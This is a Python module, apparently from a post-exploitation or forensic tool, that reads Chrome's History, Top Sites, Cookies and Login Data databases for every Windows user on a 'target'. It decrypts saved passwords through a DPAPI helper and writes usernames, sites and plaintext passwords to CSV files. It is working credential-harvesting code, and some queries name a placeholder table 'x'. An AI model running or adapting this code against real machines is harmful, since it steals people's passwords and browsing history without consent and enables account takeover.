import pathlib
import sqlite3
import Core.DPAPYCrypto.CryptoUtils
from pathlib import Path



def extractDataChrome(filePath):
    filename = pathlib.Path(filePath).name
    con = sqlite3.connect(filePath)
    cursor = con.cursor()
    if filename.upper() == "HISTORY":
        cursor.execute("SELECT * FROM urls")
    elif filename.upper() == "TOP SITES":
        cursor.execute("SELECT * FROM top_sites")
    elif filename.upper() == "FAVORITES":
        cursor.execute("SELECT * FROM x")
    elif filename.upper() == "VISITED_WEBSITES":
        cursor.execute("SELECT * FROM x")
    elif filename.upper() == "COOKIES":
        cursor.execute("SELECT * FROM cookies")
        # TODO : Decrypt cookies value
    elif filename.upper() == "LOGIN DATA":
        cursor.execute("SELECT origin_url,username_value,password_value,times_used,date_last_used FROM logins")
    value = cursor.fetchall()
    cursor.close()
    return filename,value

def extractAllDataChrome(allWindowsUsersWLocalPaths):
    atLeastOne = False
    for winUsers in allWindowsUsersWLocalPaths:
        for chromeLocalPath in winUsers.chromeLocalPaths:
            filename,data = extractDataChrome(chromeLocalPath)
            writeDataChrome(filename,data,winUsers)
            atLeastOne = True
    if atLeastOne:
        print("[+] All chrome data formatted and extracted")
    else:
        print("[-] No chrome data extractable for this target")
    return

def writeDataChrome(filename,data,winUsers):
    if filename.upper() == "HISTORY":
        fp = open(pathlib.Path(winUsers.rootLocalDirTarget / ("chrome_websites.csv")),"a")
        for entry in sorted(data,key=lambda data: data[3],reverse=True):
            fp.write(winUsers.username +","+ str(entry[3]) +"," + entry[1] +"\n")
        fp.close()
    if filename.upper() == "TOP SITES":
        fp = open(pathlib.Path(winUsers.rootLocalDirTarget / ("chrome_websites.csv")), "a")
        for entry in sorted(data, key=lambda data: data[1], reverse=True):
            fp.write(winUsers.username + "," + str(entry[1]) + "," + entry[0] + "\n")
        fp.close()
    if filename.upper() == "LOGIN DATA":
        fp = open(pathlib.Path(winUsers.rootLocalDirTarget / ("chrome_login_data.csv")), "a")
        i = 0
        decryptedChrome =""
        atLeastOne = False
        for entry in sorted(data, key=lambda data: data[1], reverse=True):
            try:
                decryptedChrome = Core.DPAPYCrypto.CryptoUtils.decryptChromePassword(entry[2],winUsers)
                if decryptedChrome:
                    atLeastOne = True
                else:
                    decryptedChrome = "NOT DECRYPTED"
            except Exception as e:
                print(e)
            fp.write(winUsers.username + "," + str(entry[0]) + "," + str(entry[1]) + "," + str(entry[3]) + "," + str(decryptedChrome) +"," + str(entry[4])+ "\n")
        fp.close()
        if atLeastOne:
            print("[+] Successfully decrypted password from chrome")
        else:
            print("[+] Could not decrypt a single password from chrome")
    return
